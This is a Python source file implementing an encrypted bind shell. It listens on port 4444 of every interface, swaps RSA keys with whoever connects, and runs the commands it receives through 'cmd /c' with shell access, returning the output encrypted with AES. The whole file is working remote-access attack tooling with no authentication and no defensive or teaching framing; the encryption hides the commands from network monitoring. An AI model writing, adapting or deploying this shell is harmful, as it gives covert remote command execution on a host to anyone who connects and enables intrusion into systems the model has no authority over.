import os
import socket
import logging
import threading
import subprocess

from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


class EncryptedBindShell:
    def __init__(self): 
        self.host = "0.0.0.0" # change this line
        self.port = 4444      # change this line

        self.client_keys = {}

        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s: %(message)s'
        )
        self.logger = logging.getLogger(__name__)

        self.server_private_key, self.server_public_key = self._generate_asymmetric_keys()

    def _generate_asymmetric_keys(self):
        self.logger.info("Generating 4096-bit RSA key pair")
        private = rsa.generate_private_key(
            public_exponent=65537,
            key_size=4096
        )
        public = private.public_key()

        return private, public
    
    def _generate_symmetric_key(self):
        aes_key = os.urandom(32)
        iv = os.urandom(16)
        return aes_key, iv

    def _decrypt_message(self, client_address, encrypted_data):
        if not self.client_keys[client_address]:
            self.logger.error(f"Public key for {client_address[0]}:{client_address[1]} not found")
            return None

        encrypted_key_iv, encrypted_message = encrypted_data.split(b"::", 1)
        
        key_iv = self.server_private_key.decrypt(
            encrypted_key_iv,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        aes_key, iv = key_iv[:32], key_iv[32:]

        cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv))
        decryptor = cipher.decryptor()
        decrypted_message = decryptor.update(encrypted_message) + decryptor.finalize()

        return decrypted_message.decode('utf-8')

    def _encrypt_message(self, client_address, message):
        if not self.client_keys[client_address]:
            raise ValueError("Client public key not received")
        
        aes_key, iv = self._generate_symmetric_key()
        cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv))
        encryptor = cipher.encryptor()
        encrypted_message = encryptor.update(message.encode('utf-8')) + encryptor.finalize()

        client_public_key = self.client_keys[client_address]
        encrypted_key = client_public_key.encrypt(
            aes_key + iv,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return encrypted_key + b"::" + encrypted_message

    def execute_command(self, command):
        process = subprocess.run(
            f"cmd /c {command}",
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE,
            shell=True
        )
        
        if process.returncode == 0:
            result = process.stdout
            self.logger.info(f"Command '{command}' executed successfully.")
        else:
            result = process.stderr
            self.logger.error(f"Command '{command}' failed")

        return result

    def handle_client(self, client_socket, client_address):
        try:
            client_public_key_data = client_socket.recv(4096)
            client_public_key = serialization.load_pem_public_key(client_public_key_data)

            self.client_keys[client_address] = client_public_key
            self.logger.info(f"Saved public key for client {client_address[0]}:{client_address[1]}")
            
            client_socket.send(
                self.server_public_key.public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                )
            )

            client_socket.send(self._encrypt_message(client_address, "KEY_RECEIVED"))

            while True:
                encrypted_data = client_socket.recv(4096)
                if not encrypted_data:
                    break

                try:
                    command = self._decrypt_message(client_address, encrypted_data)
                    if command.lower() in ['exit', 'quit']:
                        break

                    result = self.execute_command(command)
                    encrypted_result = self._encrypt_message(client_address, result.decode('utf-8', errors='ignore'))
                    client_socket.send(encrypted_result)

                except Exception as err:
                    self.logger.error(err)
                    break

        except Exception as err:
            self.logger.error(f"Client handler error: {err}")

        finally:
            self.logger.info(f"Closing connection on socket: {client_address[0]}:{client_address[1]}")
            client_socket.close()

            self.logger.info(f"Removing public key for client {client_address[0]}:{client_address[1]}")
            self.client_keys.pop(client_address)

    def start(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            server_socket.bind((self.host, self.port))
            server_socket.listen(5)

            self.logger.info(f"Listening on {self.host}:{self.port}")

            while True:
                client_socket, client_address = server_socket.accept()
                self.logger.info(f"Connection from {client_address[0]}:{client_address[1]}")
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, client_address)
                )
                client_thread.start()

        except Exception as err:
            self.logger.critical(f"Server error: {err}")

        finally:
            self.logger.info("Server shutting down, closing socket.")
            server_socket.close()


if __name__ == "__main__":
    server = EncryptedBindShell()
    server.start()
